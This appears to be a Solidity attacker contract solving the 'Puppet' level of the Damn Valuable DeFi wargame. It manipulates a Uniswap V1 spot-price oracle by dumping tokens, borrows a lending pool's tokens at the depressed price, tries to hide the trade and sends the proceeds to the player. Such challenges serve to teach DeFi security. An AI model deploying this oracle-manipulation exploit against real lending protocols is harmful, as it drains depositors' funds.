/*
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { PuppetPool } from "./PuppetPool.sol";
import { DamnValuableToken } from "../DamnValuableToken.sol";

contract Attacker {
    DamnValuableToken token;
    PuppetPool pool;

    receive() external payable{} // receive eth from uniswap

    constructor(
        uint8 v, 
        bytes32 r, 
        bytes32 s,
        uint256 playerAmount, // DVT 
        uint256 poolAmount, // DVT of lending pool
        address _pool, // lending pool
        address _uniswapPair, // UniswapV1Exchange
        address _token // DVT
    ) 
        payable 
    {

        pool = PuppetPool(_pool);
        token = DamnValuableToken(_token);
        prepareAttack(v, r, s, playerAmount, _uniswapPair);

        // tokenToEthSwapInput: {tokens_sold, min_eth, deadline}
        // We swap 1_000 DVT for 1 ETH minium. This lowers DVT price based on the oracle.
        _uniswapPair.call(abi.encodeWithSignature( "tokenToEthSwapInput(uint256,uint256,uint256)", playerAmount, 1, type(uint256).max));

        // borrow DVT from lending pool (poolAmount is 100,000 DVT in the test file).
        uint256 ethValue = pool.calculateDepositRequired(poolAmount);
        pool.borrow{value: ethValue}(poolAmount, msg.sender);

        // ethToTokenSwapOutput: {msg.value max ETH, tokens_bought, deadline}
        // Optional: Return the uniswap pool back to normal state in attempt to obfuscate what happened. (futile).
        _uniswapPair.call{value: 9.901 ether}(abi.encodeWithSignature("ethToTokenSwapOutput(uint256,uint256)", playerAmount, type(uint256).max));

        // transfer all the tokens and ETH from this contract to the player.
        token.transfer(msg.sender, token.balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    function prepareAttack(uint8 v, bytes32 r, bytes32 s, uint256 amount, address _uniswapPair) internal {
        // permit: {owner, spender, value, deadline, v, r, s} from ERC20Permit.sol
        token.permit(msg.sender, address(this), type(uint256).max, type(uint256).max, v,r,s);
        // transferFrom: {from, to, value}
        token.transferFrom(msg.sender, address(this), amount);
        // approve: {spender, value}
        token.approve(_uniswapPair, amount);
    }
}
*/